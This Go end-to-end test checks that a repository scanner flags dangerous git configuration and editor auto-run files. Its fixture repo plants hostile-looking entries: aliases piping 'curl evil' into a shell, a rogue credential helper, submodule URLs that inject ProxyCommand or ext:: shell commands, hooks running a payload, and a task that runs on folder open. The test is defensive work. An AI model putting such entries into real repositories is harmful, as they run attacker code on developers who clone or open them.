package e2e

import (
	"testing"
)

// TestE2ELocalAllFindings drives every git config rule and every worktree check
// through the real binary. The repo hides each scam where git or an editor reads
// it: a filter command that runs on checkout, a hooksPath that redirects hooks,
// an alias that runs a shell, an editor task that runs on folder open, and so
// on. If a rule stops firing, its title disappears and the test fails.
func TestE2ELocalAllFindings(t *testing.T) {
	root := makeRepo(t, e2eConfigAll())
	writeAll(t, root, e2eWorktreeFiles())
	writeAll(t, root, map[string]string{
		".git/extra.cfg":               "[alias]\n\tfrominclude = !echo hi\n",
		".git/info/attributes":         "*.bin filter=infofilter\n",
		".githooks/post-checkout":      "#!/bin/sh\nsh .payload\n",
		".git/hooks/pre-commit":        "#!/bin/sh\nsh .payload\n",
		".git/hooks/commit-msg.sample": "ignored\n",
	})

	res := runSideEye(t, "-json", root)
	if res.exit != 1 {
		t.Fatalf("exit = %d, want 1\nstderr: %s", res.exit, res.stderr)
	}
	findings := scanJSON(t, res.stdout)
	assertTitles(t, findings, e2eConfigTitles())
	assertTitles(t, findings, e2eWorktreeTitles())

	if hasTitle(findings, "Active git hook: pre-commit") {
		t.Error("core.hooksPath must redirect hooks away from .git/hooks")
	}
	if hasTitle(findings, "Active git hook: commit-msg") {
		t.Error("sample hooks must be ignored")
	}
}

// e2eConfigAll holds one entry per git config rule in rules.go.
func e2eConfigAll() string {
	return `[core]
	hooksPath = .githooks
	fsmonitor = ./watch.sh
	sshCommand = ssh -oProxyCommand=evil
	editor = vim
	askpass = ask.sh
	gitproxy = proxy.sh
	pager = less
	attributesFile = .git/info/attrs
[filter "evil"]
	clean = sh -c clean
	smudge = sh -c smudge
	process = sh -c process
[diff]
	external = diff.sh
[diff "d"]
	command = diffcmd.sh
	textconv = textconv.sh
[merge "m"]
	driver = mergedriver.sh
[credential]
	helper = !evil-helper
[alias]
	pwn = !curl evil | sh
	evil = !curl evil | sh
[submodule "sub"]
	update = !sh evil.sh
[submodule "dash"]
	url = -oProxyCommand=evil
[submodule "ext"]
	url = ext::sh -c evil
[protocol "ext"]
	allow = always
[protocol "file"]
	allow = always
[interactive]
	diffFilter = filter.sh
[gpg]
	program = gpg-evil
[sequence]
	editor = seq.sh
[tar "t"]
	command = tar-evil
[url "https://evil/"]
	insteadOf = https://good/
[include]
	path = extra.cfg
`
}

func e2eConfigTitles() []string {
	return []string{
		"core.hooksPath", "core.fsmonitor", "core.sshCommand", "core.editor",
		"core.askpass", "core.gitproxy", "core.pager", "core.attributesFile",
		"filter.evil.clean", "filter.evil.smudge", "filter.evil.process",
		"diff.external", "diff.d.command", "diff.d.textconv", "merge.m.driver",
		"credential.helper", "alias.pwn", "alias.evil",
		"submodule.sub.update", "submodule url",
		"protocol.ext.allow", "protocol.file.allow",
		"interactive.diffFilter", "gpg.program", "sequence.editor",
		"tar.t.command", "url.https://evil/.insteadOf", "include.path",
		"alias.frominclude", "Active git hook: post-checkout",
	}
}

func e2eWorktreeFiles() map[string]string {
	return map[string]string{
		".gitattributes":                  "*.dat filter=evil\n*.dat diff=evil\n*.dat merge=evil\n",
		".gitmodules":                     "[submodule \"m\"]\n\tupdate = !sh evil.sh\n[submodule \"e\"]\n\turl = ext::sh -c evil\n",
		".vscode/tasks.json":              `{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}`,
		".vscode/settings.json":           `{"security.workspace.trust.enabled":false,"editor":{"allowAutomaticTasks":true}}`,
		".devcontainer/devcontainer.json": `{"postCreateCommand":"echo x"}`,
		".devcontainer.json":              `{"initializeCommand":"echo x"}`,
		".envrc":                          "export X=1\n",
		"package.json":                    `{"scripts":{"postinstall":"node x.js"}}`,
		".npmrc":                          "onload-script=./hook.js\n",
		".pre-commit-config.yaml":         "repos: []\n",
		".yarnrc.yml":                     "plugins:\n  - path: ./p.js\n",
		".husky/pre-push":                 "#!/bin/sh\n",
	}
}

func e2eWorktreeTitles() []string {
	return []string{
		"Attribute binds filter=evil", "Attribute binds diff=evil", "Attribute binds merge=evil",
		"Attribute binds filter=infofilter",
		"submodule.m.update", "submodule url",
		"VS Code auto-run task",
		"VS Code setting: allowAutomaticTasks",
		"VS Code setting: security.workspace.trust.enabled",
		"Dev container command: postCreateCommand",
		"Dev container command: initializeCommand",
		"direnv file present",
		"npm install script: postinstall",
		"npm config loads or runs a script",
		"pre-commit config present",
		"Yarn plugins configured",
		"Husky hooks directory present",
	}
}
